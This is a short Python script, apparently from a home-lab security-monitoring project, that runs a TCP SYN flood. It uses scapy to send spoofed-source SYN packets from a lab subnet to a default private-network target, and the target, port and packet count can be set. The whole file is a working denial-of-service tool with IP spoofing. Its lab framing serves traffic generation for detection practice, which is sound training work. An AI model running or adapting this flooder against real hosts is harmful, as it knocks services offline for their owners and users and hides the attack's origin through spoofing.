#!/usr/bin/env python3
"""
attack_simulator/syn_flood.py — TCP SYN flood attack simulation.
Phase: 2 | Status: Complete
Run from: Arch Linux VM (192.168.56.10)
Target:   Kali Linux SOC Monitor (192.168.56.20)

Usage:
    sudo python syn_flood.py
    sudo python syn_flood.py --target 192.168.56.20 --port 80 --count 300
"""

import argparse
import random
import sys

try:
    from scapy.all import IP, TCP, send, RandShort
except ImportError:
    print("[!] scapy not installed. Run: pip install scapy")
    sys.exit(1)


TARGET_DEFAULT = "192.168.56.20"
PORT_DEFAULT   = 80
COUNT_DEFAULT  = 300


def syn_flood(target: str, port: int, count: int) -> None:
    """
    Send TCP SYN packets with randomised source IPs to simulate a SYN flood.

    Args:
        target: Destination IP address (Kali SOC Monitor)
        port:   Destination TCP port
        count:  Number of SYN packets to send
    """
    print(f"[*] TCP SYN Flood — Target: {target}:{port} | Count: {count}")
    print(f"[*] Start: {__import__('datetime').datetime.now().isoformat()}")

    packets = []
    for _ in range(count):
        src_ip = f"192.168.56.{random.randint(100, 200)}"   # spoof from lab subnet
        src_port = random.randint(1024, 65535)
        pkt = IP(src=src_ip, dst=target) / TCP(sport=src_port, dport=port, flags="S")
        packets.append(pkt)

    send(packets, verbose=False)

    print(f"[+] Sent {count} SYN packets to {target}:{port}")
    print(f"[+] Done: {__import__('datetime').datetime.now().isoformat()}")


def main() -> None:
    parser = argparse.ArgumentParser(description="TCP SYN Flood Simulator (Arch Linux attacker)")
    parser.add_argument("--target", default=TARGET_DEFAULT,
                        help=f"Target IP (default: {TARGET_DEFAULT})")
    parser.add_argument("--port",   type=int, default=PORT_DEFAULT,
                        help=f"Target port (default: {PORT_DEFAULT})")
    parser.add_argument("--count",  type=int, default=COUNT_DEFAULT,
                        help=f"Number of SYN packets (default: {COUNT_DEFAULT})")
    args = parser.parse_args()

    syn_flood(args.target, args.port, args.count)


if __name__ == "__main__":
    main()
